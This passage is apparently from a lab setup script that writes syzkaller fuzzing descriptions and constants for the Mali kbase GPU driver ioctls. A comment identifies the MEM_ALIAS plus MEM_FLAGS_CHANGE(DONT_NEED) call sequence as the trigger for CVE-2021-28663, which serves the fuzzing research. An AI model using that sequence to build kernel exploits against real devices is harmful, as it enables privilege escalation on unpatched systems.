openat$bifrost(fd const[AT_FDCWD], file ptr[in, string["/dev/bifrost"]], flags flags[open_flags], mode const[0]) fd_bifrost
# Our NO_MALI build registers miscdevice mali0 -> /dev/mali0
openat$mali(fd const[AT_FDCWD], file ptr[in, string["/dev/mali0"]], flags flags[open_flags], mode const[0]) fd_bifrost

# GPU VA mmap: kbase's vm_pgoff encodes the region cookie (Phase F3 smoke:
# mmap(offset=cookie bytes) materializes the SAME_VA region).
mmap$bifrost(addr const[0], len len[addr], prot flags[mmap_prot], flags flags[mmap_flags], fd fd_bifrost, offset fileoff) user_addr
munmap$bifrost(addr user_addr, len intptr)

ioctl$KBASE_IOCTL_JOB_SUBMIT(fd fd_bifrost, cmd const[KBASE_IOCTL_JOB_SUBMIT], arg ptr[in, kbase_ioctl_job_submit])
ioctl$KBASE_IOCTL_POST_TERM(fd fd_bifrost, cmd const[KBASE_IOCTL_POST_TERM], arg const[0])
ioctl$KBASE_IOCTL_SOFT_EVENT_UPDATE(fd fd_bifrost, cmd const[KBASE_IOCTL_SOFT_EVENT_UPDATE], arg ptr[in, kbase_ioctl_soft_event_update])
ioctl$KBASE_IOCTL_VERSION_CHECK(fd fd_bifrost, cmd const[KBASE_IOCTL_VERSION_CHECK], arg ptr[inout, kbase_ioctl_version_check])
ioctl$KBASE_IOCTL_VERSION_CHECK_RESERVED(fd fd_bifrost, cmd const[KBASE_IOCTL_VERSION_CHECK_RESERVED], arg ptr[inout, kbase_ioctl_version_check])
ioctl$KBASE_IOCTL_SET_FLAGS(fd fd_bifrost, cmd const[KBASE_IOCTL_SET_FLAGS], arg ptr[in, kbase_ioctl_set_flags])
ioctl$KBASE_IOCTL_GET_GPUPROPS(fd fd_bifrost, cmd const[KBASE_IOCTL_GET_GPUPROPS], arg ptr[inout, kbase_ioctl_get_gpuprops])
ioctl$KBASE_IOCTL_MEM_ALLOC(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_ALLOC], arg ptr[inout, kbase_ioctl_mem_alloc])
# in-view only: out.value aliases the gpu_addr@0 slot; observing it would
# poison the gpu_addr resource with non-address query values.
ioctl$KBASE_IOCTL_MEM_QUERY(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_QUERY], arg ptr[in, kbase_ioctl_mem_query])
ioctl$KBASE_IOCTL_MEM_FREE(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_FREE], arg ptr[in, kbase_ioctl_mem_free])
ioctl$KBASE_IOCTL_HWCNT_READER_SETUP(fd fd_bifrost, cmd const[KBASE_IOCTL_HWCNT_READER_SETUP], arg ptr[in, kbase_ioctl_hwcnt_reader_setup]) fd_hwcnt
ioctl$KBASE_IOCTL_HWCNT_SET(fd fd_bifrost, cmd const[KBASE_IOCTL_HWCNT_SET], arg ptr[inout, kbase_ioctl_hwcnt_values])
# r28p0-only legacy in-kernel hwcnt (removed UK 11.33): ENABLE carries a raw
# GPU dump address; DUMP/CLEAR are _IO (no arg).
ioctl$KBASE_IOCTL_HWCNT_ENABLE(fd fd_bifrost, cmd const[KBASE_IOCTL_HWCNT_ENABLE], arg ptr[in, kbase_ioctl_hwcnt_enable])
ioctl$KBASE_IOCTL_HWCNT_DUMP(fd fd_bifrost, cmd const[KBASE_IOCTL_HWCNT_DUMP], arg const[0])
ioctl$KBASE_IOCTL_HWCNT_CLEAR(fd fd_bifrost, cmd const[KBASE_IOCTL_HWCNT_CLEAR], arg const[0])
ioctl$KBASE_IOCTL_DISJOINT_QUERY(fd fd_bifrost, cmd const[KBASE_IOCTL_DISJOINT_QUERY], arg ptr[out, kbase_ioctl_disjoint_query])
ioctl$KBASE_IOCTL_GET_DDK_VERSION(fd fd_bifrost, cmd const[KBASE_IOCTL_GET_DDK_VERSION], arg ptr[inout, kbase_ioctl_get_ddk_version])
# THREE size-encoded variants share nr 14 in r28p0: 8B (10.2), 16B (11.5), 24B (current).
ioctl$KBASE_IOCTL_MEM_JIT_INIT(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_JIT_INIT], arg ptr[in, kbase_ioctl_mem_jit_init])
ioctl$KBASE_IOCTL_MEM_JIT_INIT_10_2(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_JIT_INIT_10_2], arg ptr[in, kbase_ioctl_mem_jit_init_10_2])
ioctl$KBASE_IOCTL_MEM_JIT_INIT_11_5(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_JIT_INIT_11_5], arg ptr[in, kbase_ioctl_mem_jit_init_11_5])
ioctl$KBASE_IOCTL_MEM_EXEC_INIT(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_EXEC_INIT], arg ptr[in, kbase_ioctl_mem_exec_init])
ioctl$KBASE_IOCTL_MEM_SYNC(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_SYNC], arg ptr[in, kbase_ioctl_mem_sync])
# in-view only: out.offset aliases gpu_addr@0 (not an address).
ioctl$KBASE_IOCTL_MEM_FIND_CPU_OFFSET(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_FIND_CPU_OFFSET], arg ptr[in, kbase_ioctl_mem_find_cpu_offset])
ioctl$KBASE_IOCTL_MEM_FIND_GPU_START_AND_OFFSET(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_FIND_GPU_START_AND_OFFSET], arg ptr[inout, kbase_ioctl_mem_find_gpu_start_and_offset])
ioctl$KBASE_IOCTL_GET_CONTEXT_ID(fd fd_bifrost, cmd const[KBASE_IOCTL_GET_CONTEXT_ID], arg ptr[out, kbase_ioctl_get_context_id])
ioctl$KBASE_IOCTL_TLSTREAM_ACQUIRE(fd fd_bifrost, cmd const[KBASE_IOCTL_TLSTREAM_ACQUIRE], arg ptr[in, kbase_ioctl_tlstream_acquire])
ioctl$KBASE_IOCTL_TLSTREAM_FLUSH(fd fd_bifrost, cmd const[KBASE_IOCTL_TLSTREAM_FLUSH], arg const[0])
ioctl$KBASE_IOCTL_MEM_COMMIT(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_COMMIT], arg ptr[in, kbase_ioctl_mem_commit])
ioctl$KBASE_IOCTL_MEM_ALIAS(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_ALIAS], arg ptr[inout, kbase_ioctl_mem_alias])
ioctl$KBASE_IOCTL_MEM_IMPORT(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_IMPORT], arg ptr[inout, kbase_ioctl_mem_import])
ioctl$KBASE_IOCTL_MEM_FLAGS_CHANGE(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_FLAGS_CHANGE], arg ptr[in, kbase_ioctl_mem_flags_change])
ioctl$KBASE_IOCTL_STREAM_CREATE(fd fd_bifrost, cmd const[KBASE_IOCTL_STREAM_CREATE], arg ptr[in, kbase_ioctl_stream_create]) fd_fence
ioctl$KBASE_IOCTL_FENCE_VALIDATE(fd fd_bifrost, cmd const[KBASE_IOCTL_FENCE_VALIDATE], arg ptr[in, kbase_ioctl_fence_validate])
ioctl$KBASE_IOCTL_MEM_PROFILE_ADD(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_PROFILE_ADD], arg ptr[in, kbase_ioctl_mem_profile_add])
ioctl$KBASE_IOCTL_STICKY_RESOURCE_MAP(fd fd_bifrost, cmd const[KBASE_IOCTL_STICKY_RESOURCE_MAP], arg ptr[in, kbase_ioctl_sticky_resource_map])
ioctl$KBASE_IOCTL_STICKY_RESOURCE_UNMAP(fd fd_bifrost, cmd const[KBASE_IOCTL_STICKY_RESOURCE_UNMAP], arg ptr[in, kbase_ioctl_sticky_resource_unmap])
# in-view only (32B): out view aliases the request_flags/paddings slots.
ioctl$KBASE_IOCTL_GET_CPU_GPU_TIMEINFO(fd fd_bifrost, cmd const[KBASE_IOCTL_GET_CPU_GPU_TIMEINFO], arg ptr[in, kbase_ioctl_get_cpu_gpu_timeinfo])

# hwcnt reader fd (returned by HWCNT_READER_SETUP) — mali_kbase_hwcnt_reader.h.
ioctl$KBASE_HWCNT_READER_GET_HWVER(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_GET_HWVER], arg ptr[out, int32])
ioctl$KBASE_HWCNT_READER_GET_BUFFER_SIZE(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_GET_BUFFER_SIZE], arg ptr[out, int32])
ioctl$KBASE_HWCNT_READER_DUMP(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_DUMP], arg ptr[in, int32])
ioctl$KBASE_HWCNT_READER_CLEAR(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_CLEAR], arg ptr[in, int32])
ioctl$KBASE_HWCNT_READER_GET_BUFFER(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_GET_BUFFER], arg ptr[out, kbase_hwcnt_reader_metadata_legacy])
ioctl$KBASE_HWCNT_READER_GET_BUFFER_WITH_CYCLES(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_GET_BUFFER_WITH_CYCLES], arg ptr[out, kbase_hwcnt_reader_metadata])
ioctl$KBASE_HWCNT_READER_PUT_BUFFER(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_PUT_BUFFER], arg ptr[in, kbase_hwcnt_reader_metadata_legacy])
ioctl$KBASE_HWCNT_READER_PUT_BUFFER_WITH_CYCLES(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_PUT_BUFFER_WITH_CYCLES], arg ptr[in, kbase_hwcnt_reader_metadata])
ioctl$KBASE_HWCNT_READER_SET_INTERVAL(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_SET_INTERVAL], arg ptr[in, int32])
ioctl$KBASE_HWCNT_READER_ENABLE_EVENT(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_ENABLE_EVENT], arg ptr[in, int32])
ioctl$KBASE_HWCNT_READER_DISABLE_EVENT(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_DISABLE_EVENT], arg ptr[in, int32])
ioctl$KBASE_HWCNT_READER_GET_API_VERSION(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_GET_API_VERSION], arg ptr[in, int32])
# same nr 0xFF, size-encoded newer variant (release drift axis)
ioctl$KBASE_HWCNT_READER_GET_API_VERSION_WITH_FEATURES(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_GET_API_VERSION_WITH_FEATURES], arg ptr[in, kbase_hwcnt_reader_api_version])

type base_atom_id int8

base_jd_udata {
	blob	array[int64, 2]
}

base_dependency {
	atom_id			base_atom_id
	dependency_type	flags[base_jd_dep_type, int8]
}

base_jd_atom_v2 {
	jc			int64
	udata			base_jd_udata
	extres_list		int64
	nr_extres		int16
	jit_id			array[int8, 2]
	pre_dep			array[base_dependency, 2]
	atom_number		base_atom_id
	prio			flags[base_jd_prio, int8]
	device_nr		int8
	jobslot			int8
	core_req		flags[base_jd_core_req, int32]
	renderpass_id	int8
	padding			array[const[0, int8], 7]
}

kbase_ioctl_job_submit {
	addr		ptr64[in, array[base_jd_atom_v2]]
	nr_atoms	len[addr, int32]
# sizeof(base_jd_atom_v2)
	stride		const[56, int32]
}

kbase_ioctl_version_check {
	major	int16
	minor	int16
}

kbase_ioctl_set_flags {
	create_flags	flags[basep_context_create_kernel_flags, int32]
}

kbase_ioctl_get_gpuprops {
	buffer	ptr64[out, array[int8]]
	size	len[buffer, int32]
	flags	const[0, int32]
}

kbase_ioctl_mem_alloc {
# C union (32B): in {va_pages, commit_pages, extension, flags};
# out {flags@0, gpu_va@8}. Modeled per upstream dev_bifrost.txt: in-view
# fields carry the request; @0 is the out view (out_overlay) and @8 copyouts
# the returned cookie VA into gpu_addr -- a NON-consuming producer, so the
# gpu_addr chain (alloc -> alias/flags_change -> free) stays live (an
# (inout) modeling makes every consumer also the only producer, which
# syzkaller resolves by disabling all of them).
	va_pages	int64
	commit_pages	int64
	extent		int64
	flags		flags[base_mem_alloc_flags, int64]
	out_flags	int64	(out_overlay)
	gpu_va		gpu_addr
}

kbase_ioctl_mem_query {
	gpu_addr	gpu_addr
	query		flags[kbase_ioctl_mem_query_flags, int64]
}

kbase_ioctl_mem_free {
	gpu_addr	gpu_addr
}

kbase_ioctl_hwcnt_reader_setup {
	buffer_count	int32
	fe_bm			int32
	shader_bm		int32
	tiler_bm		int32
	mmu_l2_bm		int32
}

kbase_ioctl_hwcnt_values {
	data	ptr64[out, array[int8]]
	size	len[data, int32]
	padding	const[0, int32]
}

# r28p0-only legacy hwcnt enable (24B): dump_buffer is a raw GPU address the
# MMU writes counter values to (int64, not a managed kbase region handle).
kbase_ioctl_hwcnt_enable {
	dump_buffer	int64
	fe_bm		int32
	shader_bm	int32
	tiler_bm	int32
	mmu_l2_bm	int32
}

kbase_ioctl_disjoint_query {
	counter	int32
}

kbase_ioctl_get_ddk_version {
	version_buffer	ptr64[out, array[int8]]
	size			len[version_buffer, int32]
	padding			const[0, int32]
}

kbase_ioctl_mem_jit_init {
	va_pages		int64
	max_allocations	int8
	trim_level		int8
	group_id		int8
	padding			array[const[0, int8], 5]
	phys_pages		int64
}

kbase_ioctl_mem_jit_init_10_2 {
	va_pages	int64
}

kbase_ioctl_mem_jit_init_11_5 {
	va_pages		int64
	max_allocations	int8
	trim_level		int8
	group_id		int8
	padding			array[const[0, int8], 5]
}

kbase_ioctl_mem_exec_init {
	va_pages	int64
}

kbase_ioctl_mem_sync {
	handle		gpu_addr
	user_addr	user_addr
	size		int64
	type		flags[base_syncset_op_flags, int8]
	padding		array[const[0, int8], 7]
}

kbase_ioctl_mem_find_cpu_offset {
	gpu_addr	gpu_addr
	cpu_addr	user_addr
	size		int64
}

kbase_ioctl_mem_find_gpu_start_and_offset {
# union (16B): in {gpu_addr, size}; out {start@0, offset@8}. Slot@0 is both
# the in-view gpu_addr and the out-view start (a live region base): consumes
# gpu_addr as input, copyouts start back into gpu_addr for chaining. The
# overlay is declared on the size field (must not be on the first field); the
# compiler lays the two views out independently so both stay 16B.
	gpu_addr	gpu_addr
	size		int64
	start		gpu_addr	(out_overlay)
	offset		int64
}

kbase_ioctl_get_context_id {
	id	int32
}

kbase_ioctl_tlstream_acquire {
	flags	int32
}

kbase_ioctl_mem_commit {
	gpu_addr	gpu_addr
	pages		int64
}

kbase_ioctl_mem_alias {
# union (32B): in {flags, stride, nents, aliasing_info};
# out {flags@0, gpu_va@8, va_pages@16}. @8 doubles as out.gpu_va.
# NOTE (CVE-2021-28663 vehicle): MEM_ALIAS + MEM_FLAGS_CHANGE(DONT_NEED) is
# the vulnerable lifetime sequence on THIS release — see evidence/09.
# NOTE: kbase_mem_alias computes num_pages = nents * stride, i.e. stride is
# consumed as PAGES despite the header comment saying bytes (verified
# empirically in evidence/09 §2 — byte strides make the alias mmap fail).
	flags		flags[base_mem_alloc_flags, int64]
	stride		int64
	nents		len[aliasing_info, int64]
	aliasing_info	ptr64[in, array[base_mem_aliasing_info]]
	out_flags	int64	(out_overlay)
	out_gpu_va	gpu_addr
	out_va_pages	int64
}

base_mem_aliasing_info {
	handle	gpu_addr
	offset	int64
	length	int64
}

kbase_ioctl_mem_import {
# union (24B): in {flags, phandle, type, padding}; out {flags@0, gpu_va@8,
# va_pages@16}. Same layout as MEM_ALIAS: @8 is the in-view phandle and the
# out-view gpu_va (out_overlay), so the returned VA copyouts into gpu_addr
# as a non-consuming producer.
	flags		flags[base_mem_alloc_flags, int64]
	phandle		gpu_addr
	type		flags[base_mem_import_type, int32]
	padding		const[0, int32]
	out_flags	int64	(out_overlay)
	out_gpu_va	gpu_addr
	out_va_pages	int64
}

kbase_ioctl_mem_flags_change {
	gpu_va	gpu_addr
	flags	flags[base_mem_alloc_flags, int64]
	mask	int64
}

kbase_ioctl_stream_create {
	name	array[int8, 32]
}

kbase_ioctl_fence_validate {
	fd	fd_fence
}

kbase_ioctl_mem_profile_add {
	buffer	ptr64[in, array[int8]]
	len		len[buffer, int32]
	padding	const[0, int32]
}

kbase_ioctl_sticky_resource_map {
	count	len[address, int64]
	address	ptr64[in, array[gpu_addr]]
}

kbase_ioctl_sticky_resource_unmap {
	count	len[address, int64]
	address	ptr64[in, array[gpu_addr]]
}

kbase_ioctl_soft_event_update {
	event		gpu_addr
	new_status	int32
	flags		const[0, int32]
}

kbase_ioctl_get_cpu_gpu_timeinfo {
	request_flags	flags[base_timerequest_allowed_flags, int32]
	paddings		array[const[0, int8], 28]
}

# r28p0 has TWO generations of the buffer ioctls on the SAME nr (0x20/0x21),
# distinguished by _IOC_SIZE: legacy (offsetof-cycles = 16B) and *_WITH_CYCLES
# (32B full metadata). Model both, release-exact.
kbase_hwcnt_reader_metadata_legacy {
	timestamp	int64
	event_id	int32
	buffer_idx	int32
}

kbase_hwcnt_reader_api_version {
	version	int32
	features int32
}

kbase_hwcnt_reader_metadata_cycles {
	top			int64
	shader_cores	int64
}

kbase_hwcnt_reader_metadata {
	timestamp	int64
	event_id	int32
	buffer_idx	int32
	cycles		kbase_hwcnt_reader_metadata_cycles
}

base_jd_dep_type = BASE_JD_DEP_TYPE_INVALID, BASE_JD_DEP_TYPE_DATA, BASE_JD_DEP_TYPE_ORDER
base_jd_prio = BASE_JD_PRIO_MEDIUM, BASE_JD_PRIO_HIGH, BASE_JD_PRIO_LOW
base_jd_core_req = BASE_JD_REQ_DEP, BASE_JD_REQ_FS, BASE_JD_REQ_CS, BASE_JD_REQ_T, BASE_JD_REQ_CF, BASE_JD_REQ_V, BASE_JD_REQ_FS_AFBC, BASE_JD_REQ_EVENT_COALESCE, BASE_JD_REQ_COHERENT_GROUP, BASE_JD_REQ_PERMON, BASE_JD_REQ_EXTERNAL_RESOURCES, BASE_JD_REQ_SOFT_JOB, BASE_JD_REQ_ONLY_COMPUTE, BASE_JD_REQ_SPECIFIC_COHERENT_GROUP, BASE_JD_REQ_EVENT_ONLY_ON_FAILURE, BASE_JD_REQ_SKIP_CACHE_START, BASE_JD_REQ_SKIP_CACHE_END, BASE_JD_REQ_JOB_SLOT, BASE_JD_REQ_START_RENDERPASS, BASE_JD_REQ_END_RENDERPASS
kbase_ioctl_mem_query_flags = KBASE_MEM_QUERY_COMMIT_SIZE, KBASE_MEM_QUERY_VA_SIZE, KBASE_MEM_QUERY_FLAGS
base_syncset_op_flags = BASE_SYNCSET_OP_MSYNC, BASE_SYNCSET_OP_CSYNC
# all bits verified present in the r28p0 jm/base headers (evidence/11)
base_mem_alloc_flags = BASE_MEM_PROT_CPU_RD, BASE_MEM_PROT_CPU_WR, BASE_MEM_PROT_GPU_RD, BASE_MEM_PROT_GPU_WR, BASE_MEM_PROT_GPU_EX, BASEP_MEM_PERMANENT_KERNEL_MAPPING, BASE_MEM_GPU_VA_SAME_4GB_PAGE, BASEP_MEM_NO_USER_FREE, BASE_MEM_RESERVED_BIT_8, BASE_MEM_GROW_ON_GPF, BASE_MEM_COHERENT_SYSTEM, BASE_MEM_COHERENT_LOCAL, BASE_MEM_CACHED_CPU, BASE_MEM_SAME_VA, BASE_MEM_NEED_MMAP, BASE_MEM_COHERENT_SYSTEM_REQUIRED, BASE_MEM_PROTECTED, BASE_MEM_DONT_NEED, BASE_MEM_IMPORT_SHARED, BASE_MEM_RESERVED_BIT_19, BASE_MEM_TILER_ALIGN_TOP, BASE_MEM_UNCACHED_GPU, BASE_MEM_IMPORT_SYNC_ON_MAP_UNMAP, BASE_MEM_FLAG_MAP_FIXED
base_mem_import_type = BASE_MEM_IMPORT_TYPE_INVALID, BASE_MEM_IMPORT_TYPE_UMM, BASE_MEM_IMPORT_TYPE_USER_BUFFER
basep_context_create_kernel_flags = BASE_CONTEXT_SYSTEM_MONITOR_SUBMIT_DISABLED, 0x8, 0x10, 0x20, 0x40
base_timerequest_allowed_flags = BASE_TIMEINFO_MONOTONIC_FLAG, BASE_TIMEINFO_TIMESTAMP_FLAG, BASE_TIMEINFO_CYCLE_COUNTER_FLAG, BASE_TIMEINFO_KERNEL_SOURCE_FLAG, BASE_TIMEINFO_USER_SOURCE_FLAG
__PL_04__
  sha256_pin "$LAB_ROOT/fuzzing/syzkaller/syzkaller/sys/linux/dev_mali_r28p0.txt" "18f6fa688bb6e0c6aebb0a248e2dd1844024c10f4832d28584d13f412b0764b0"

  mkdir -p "$(dirname "$LAB_ROOT/fuzzing/syzkaller/syzkaller/sys/linux/dev_mali_r28p0.txt.const")"
  cat > "$LAB_ROOT/fuzzing/syzkaller/syzkaller/sys/linux/dev_mali_r28p0.txt.const" <<'__PL_05__'
# Code generated by syz-sysgen. DO NOT EDIT.
arches = amd64
AT_FDCWD = amd64:18446744073709551516
BASEP_MEM_INVALID_HANDLE = amd64:0
BASEP_MEM_NO_USER_FREE = amd64:128
BASEP_MEM_PERMANENT_KERNEL_MAPPING = amd64:32
BASEP_MEM_WRITE_ALLOC_PAGES_HANDLE = amd64:16384
BASE_CONTEXT_SYSTEM_MONITOR_SUBMIT_DISABLED = amd64:2
BASE_JD_DEP_TYPE_DATA = amd64:1
BASE_JD_DEP_TYPE_INVALID = amd64:0
BASE_JD_DEP_TYPE_ORDER = amd64:2
BASE_JD_PRIO_HIGH = amd64:1
BASE_JD_PRIO_LOW = amd64:2
BASE_JD_PRIO_MEDIUM = amd64:0
BASE_JD_REQ_CF = amd64:8
BASE_JD_REQ_COHERENT_GROUP = amd64:64
BASE_JD_REQ_CS = amd64:2
BASE_JD_REQ_DEP = amd64:0
BASE_JD_REQ_END_RENDERPASS = amd64:524288
BASE_JD_REQ_EVENT_COALESCE = amd64:32
BASE_JD_REQ_EVENT_ONLY_ON_FAILURE = amd64:4096
BASE_JD_REQ_EXTERNAL_RESOURCES = amd64:256
BASE_JD_REQ_FS = amd64:1
BASE_JD_REQ_FS_AFBC = amd64:8192
BASE_JD_REQ_JOB_SLOT = amd64:131072
BASE_JD_REQ_ONLY_COMPUTE = amd64:1024
BASE_JD_REQ_PERMON = amd64:128
BASE_JD_REQ_SKIP_CACHE_END = amd64:65536
BASE_JD_REQ_SKIP_CACHE_START = amd64:32768
BASE_JD_REQ_SOFT_JOB = amd64:512
BASE_JD_REQ_SPECIFIC_COHERENT_GROUP = amd64:2048
BASE_JD_REQ_START_RENDERPASS = amd64:262144
BASE_JD_REQ_T = amd64:4
BASE_JD_REQ_V = amd64:16
BASE_MEM_CACHED_CPU = amd64:4096
BASE_MEM_COHERENT_LOCAL = amd64:2048
BASE_MEM_COHERENT_SYSTEM = amd64:1024
BASE_MEM_COHERENT_SYSTEM_REQUIRED = amd64:32768
BASE_MEM_DONT_NEED = amd64:131072
BASE_MEM_FLAG_MAP_FIXED = amd64:134217728
BASE_MEM_GPU_VA_SAME_4GB_PAGE = amd64:64
BASE_MEM_GROW_ON_GPF = amd64:512
BASE_MEM_IMPORT_SHARED = amd64:262144
BASE_MEM_IMPORT_SYNC_ON_MAP_UNMAP = amd64:67108864
BASE_MEM_IMPORT_TYPE_INVALID = amd64:0
BASE_MEM_IMPORT_TYPE_UMM = amd64:2
BASE_MEM_IMPORT_TYPE_USER_BUFFER = amd64:3
BASE_MEM_NEED_MMAP = amd64:16384
BASE_MEM_PROTECTED = amd64:65536
BASE_MEM_PROT_CPU_RD = amd64:1
BASE_MEM_PROT_CPU_WR = amd64:2
BASE_MEM_PROT_GPU_EX = amd64:16
BASE_MEM_PROT_GPU_RD = amd64:4
BASE_MEM_PROT_GPU_WR = amd64:8
BASE_MEM_RESERVED_BIT_19 = amd64:524288
BASE_MEM_RESERVED_BIT_8 = amd64:256
BASE_MEM_SAME_VA = amd64:8192
BASE_MEM_TILER_ALIGN_TOP = amd64:1048576
BASE_MEM_UNCACHED_GPU = amd64:2097152
BASE_SYNCSET_OP_CSYNC = amd64:2
BASE_SYNCSET_OP_MSYNC = amd64:1
BASE_TIMEINFO_CYCLE_COUNTER_FLAG = amd64:4
BASE_TIMEINFO_KERNEL_SOURCE_FLAG = amd64:1073741824
BASE_TIMEINFO_MONOTONIC_FLAG = amd64:1
BASE_TIMEINFO_TIMESTAMP_FLAG = amd64:2
BASE_TIMEINFO_USER_SOURCE_FLAG = amd64:2147483648
KBASE_HWCNT_READER_CLEAR = amd64:1074052625
KBASE_HWCNT_READER_DISABLE_EVENT = amd64:1074052673
KBASE_HWCNT_READER_DUMP = amd64:1074052624
KBASE_HWCNT_READER_ENABLE_EVENT = amd64:1074052672
KBASE_HWCNT_READER_GET_API_VERSION = amd64:1074052863
KBASE_HWCNT_READER_GET_API_VERSION_WITH_FEATURES = amd64:1074315007
KBASE_HWCNT_READER_GET_BUFFER = amd64:2148580896
KBASE_HWCNT_READER_GET_BUFFER_SIZE = amd64:2147794433
KBASE_HWCNT_READER_GET_BUFFER_WITH_CYCLES = amd64:2149629472
KBASE_HWCNT_READER_GET_HWVER = amd64:2147794432
KBASE_HWCNT_READER_PUT_BUFFER = amd64:1074839073
KBASE_HWCNT_READER_PUT_BUFFER_WITH_CYCLES = amd64:1075887649
KBASE_HWCNT_READER_SET_INTERVAL = amd64:1074052656
KBASE_IOCTL_DISJOINT_QUERY = amd64:2147778572
KBASE_IOCTL_FENCE_VALIDATE = amd64:1074036761
KBASE_IOCTL_GET_CONTEXT_ID = amd64:2147778577
KBASE_IOCTL_GET_CPU_GPU_TIMEINFO = amd64:3223355442
KBASE_IOCTL_GET_DDK_VERSION = amd64:1074823181
KBASE_IOCTL_GET_GPUPROPS = amd64:1074823171
KBASE_IOCTL_HWCNT_CLEAR = amd64:32779
KBASE_IOCTL_HWCNT_DUMP = amd64:32778
KBASE_IOCTL_HWCNT_ENABLE = amd64:1075347465
KBASE_IOCTL_HWCNT_READER_SETUP = amd64:1075085320
KBASE_IOCTL_HWCNT_SET = amd64:1074823200
KBASE_IOCTL_JOB_SUBMIT = amd64:1074823170
KBASE_IOCTL_MEM_ALIAS = amd64:3223355413
KBASE_IOCTL_MEM_ALLOC = amd64:3223355397
KBASE_IOCTL_MEM_COMMIT = amd64:1074823188
KBASE_IOCTL_MEM_EXEC_INIT = amd64:1074298918
KBASE_IOCTL_MEM_FIND_CPU_OFFSET = amd64:3222831120
KBASE_IOCTL_MEM_FIND_GPU_START_AND_OFFSET = amd64:3222306847
KBASE_IOCTL_MEM_FLAGS_CHANGE = amd64:1075347479
KBASE_IOCTL_MEM_FREE = amd64:1074298887
KBASE_IOCTL_MEM_IMPORT = amd64:3222831126
KBASE_IOCTL_MEM_JIT_INIT = amd64:1075347470
KBASE_IOCTL_MEM_JIT_INIT_10_2 = amd64:1074298894
KBASE_IOCTL_MEM_JIT_INIT_11_5 = amd64:1074823182
KBASE_IOCTL_MEM_PROFILE_ADD = amd64:1074823195
KBASE_IOCTL_MEM_QUERY = amd64:3222306822
KBASE_IOCTL_MEM_SYNC = amd64:1075871759
KBASE_IOCTL_POST_TERM = amd64:32772
KBASE_IOCTL_SET_FLAGS = amd64:1074036737
KBASE_IOCTL_SOFT_EVENT_UPDATE = amd64:1074823196
KBASE_IOCTL_STICKY_RESOURCE_MAP = amd64:1074823197
KBASE_IOCTL_STICKY_RESOURCE_UNMAP = amd64:1074823198
KBASE_IOCTL_STREAM_CREATE = amd64:1075871768
KBASE_IOCTL_TLSTREAM_ACQUIRE = amd64:1074036754
KBASE_IOCTL_TLSTREAM_FLUSH = amd64:32787
KBASE_IOCTL_VERSION_CHECK = amd64:3221520384
KBASE_IOCTL_VERSION_CHECK_RESERVED = amd64:3221520436
KBASE_MEM_QUERY_COMMIT_SIZE = amd64:1
KBASE_MEM_QUERY_FLAGS = amd64:3
KBASE_MEM_QUERY_VA_SIZE = amd64:2
__NR_ioctl = amd64:16
__NR_mmap = amd64:9
__NR_munmap = amd64:11
__NR_openat = amd64:257
__PL_05__
  sha256_pin "$LAB_ROOT/fuzzing/syzkaller/syzkaller/sys/linux/dev_mali_r28p0.txt.const" "3b782af08be521b4f89f40f6d52ab9392d1c5108833b54e264ac5416749d7361"

  mkdir -p "$(dirname "$LAB_ROOT/fuzzing/syzkaller/syzkaller/sys/linux/dev_mali_r41p0.txt")"
  cat > "$LAB_ROOT/fuzzing/syzkaller/syzkaller/sys/linux/dev_mali_r41p0.txt" <<'__PL_06__'
# syzkaller syscall descriptions for the Mali "kbase" UAPI.
#
# RELEASE-MATCHED to: r41p0-01eac0 (UAPI UK 11.36, POST the CVE-2021-28663
# fix), JOB MANAGER mode (MALI_USE_CSF == 0) exactly as built into this lab's
# 4.19.320 NO_MALI kernel (builds/linux-4.19.320-r41p0, banner r41p0-01eac0).
#
# Provenance & verification (full detail in evidence/06_fuzzing.md):
# - Base layer adapted from upstream sys/linux/dev_bifrost.txt (ChromeOS-4.19
#   bifrost, JM-era) and cross-checked field-by-field against this release's
#   pristine uapi headers under harness/release_uapi/r41p0-01eac0 (hashes in
#   MANIFEST.md). The r56p0 CSF overlay (upstream dev_mali.txt) is NOT used:
#   our kernel dispatches the JM ioctl branch only.
# - Layout drift fixed vs dev_bifrost.txt (verified by _Static_assert gate in
#   harness/release_uapi/r41p0-01eac0/layout_check_r41p0.c):
#   * base_jd_atom_v2: @34 is jit_id[2] (u8) in r41p0 — bifrost desc modeled
#     the older compat_core_req(u16) name there (same 2 bytes, 56B total).
#   * kbase_hwcnt_reader_metadata: r41p0 appends `cycles` (16B) -> 32B total
#     (ChromeOS-era was 16B; the HWCNT_READER_* cmd sizes shift with it).
#   * kbase_ioctl_get_cpu_gpu_timeinfo: in.paddings is __u32[7] (28B) in
#     r41p0, not u8[7]; total in-view 32B.
#   * kbase_ioctl_mem_jit_init: r41p0 has the 24B form with trailing
#     phys_pages (already matched by bifrost desc; the 10.2/11.5 legacy
#     structs are gone — removed in UK 11.36).
# - Dropped (NOT part of r41p0): MEM_JIT_INIT_10_2 / MEM_JIT_INIT_11_5
#   (removed UK 11.36), legacy KBASE_IOCTL_HWCNT_ENABLE/DUMP/CLEAR (removed
